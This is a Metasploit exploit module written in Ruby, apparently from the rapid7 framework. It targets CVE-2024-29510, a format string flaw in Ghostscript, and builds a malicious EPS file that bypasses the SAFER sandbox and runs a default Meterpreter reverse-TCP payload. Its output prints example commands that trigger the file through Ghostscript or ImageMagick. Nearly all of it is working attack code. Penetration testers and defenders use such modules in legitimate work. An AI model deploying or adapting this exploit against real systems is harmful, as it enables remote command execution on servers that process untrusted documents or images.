##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit

  Rank = ExcellentRanking

  include Msf::Exploit::FILEFORMAT

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Ghostscript Command Execution via Format String',
        'Description' => %q{
          This module exploits a format string vulnerability in Ghostscript
          versions before 10.03.1 to achieve a SAFER sandbox bypass and execute
          arbitrary commands. This vulnerability is reachable via libraries such as
          ImageMagick.

          This exploit only works against Ghostscript versions 10.03.0 and
          10.01.2. Some offsets adjustement will probably be needed to make it
          work with other versions.
        },
        'Author' => [
          'Thomas Rinsma', # Vuln discovery and PoC
          'Christophe De La fuente' # Metasploit module
        ],
        'References' => [
          ['CVE', '2024-29510'],
          ['URL', 'https://bugs.ghostscript.com/show_bug.cgi?id=707662'],
          ['URL', 'https://codeanlabs.com/blog/research/cve-2024-29510-ghostscript-format-string-exploitation/']
        ],
        'DisclosureDate' => '2024-03-14',
        'License' => MSF_LICENSE,
        'Platform' => ['unix', 'linux', 'win'],
        'Arch' => [ARCH_CMD, ARCH_X86, ARCH_X64],
        'Privileged' => false,
        'Targets' => [
          [
            'Linux Command',
            {
              'Arch' => ARCH_CMD,
              'Platform' => [ 'unix', 'linux' ],
              'DefaultOptions' => {
                # Payload is not set automatically when selecting this target.
                # Select a x64 fetch payload by default.
                'PAYLOAD' => 'cmd/linux/http/x64/meterpreter_reverse_tcp'
              }
            }
          ]
        ],
        'DefaultTarget' => 0,
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'SideEffects' => [ARTIFACTS_ON_DISK],
          'Reliability' => [REPEATABLE_SESSION]
        }
      )
    )

    register_options([
      OptString.new('FILENAME', [true, 'Output Encapsulated PostScript (EPS) file', 'msf.eps']),
      OptInt.new('INDEX_OUT_PTR', [true, 'Index of `gp_file *out` on the stack (see the full documentation for details `info -d`)', 5])
    ])
  end

  def exploit
    xploit = template.sub('MSF_PAYLOAD', payload.encoded)
    xploit = xploit.sub('MSF_IDXOUTPTR', datastore['INDEX_OUT_PTR'].to_s)

    file_create(xploit)
    print_good('You will need to start a handler for the selected payload first.')
    print_good("Example usage with Ghostscript: gs -q -dSAFER -dBATCH -dNODISPLAY #{datastore['FILENAME']}")
    print_good("Example usage with ImageMagick: identify #{datastore['FILENAME']}")
  end

  def template
    xploit = File.read(File.join(
      Msf::Config.data_directory, 'exploits', 'CVE-2024-29510', 'ghostscript_format_string.eps'
    ))

    # Remove comments
    xploit.gsub!(/\s*% .+$/, '')

    # Remove empty lines and lines with a single %
    xploit.gsub(/^%?$\n/, '')
  end

end
